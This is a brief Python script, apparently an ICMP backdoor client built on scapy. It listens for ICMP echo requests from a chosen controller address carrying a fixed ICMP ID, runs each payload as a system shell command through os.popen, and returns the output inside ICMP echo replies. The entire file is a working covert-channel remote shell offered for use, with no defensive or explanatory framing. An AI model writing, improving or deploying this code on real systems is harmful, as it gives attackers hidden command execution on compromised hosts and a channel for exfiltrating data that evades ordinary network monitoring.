from scapy.all import sr,IP,ICMP,Raw,sniff
import argparse
import os
import sys


ICMP_ID = int(13170)
TTL = int(64)

def check_scapy():
    try:
        from scapy.all import sr,IP,ICMP,Raw,sniff
    except ImportError:
        print("Install the Py3 scapy module")


def icmpshell(pkt):
    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
        icmppaket = (pkt[Raw].load).decode('utf-8', errors='ignore')
        if icmppaket.strip() == "exit":
            sys.exit()
        try:
            payload = os.popen(icmppaket).readlines()
            icmppacket = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload))
            sr(icmppacket, timeout=0, verbose=0)
        except:
            pass
    else:
        pass

if __name__=="__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument('-i', '--interface', type=str, required=True, help="(Virtual) Network Interface (e.g. eth0)")
	parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
	args = parser.parse_args()


	sniff(iface=args.interface, prn=icmpshell, filter="icmp", store="0")
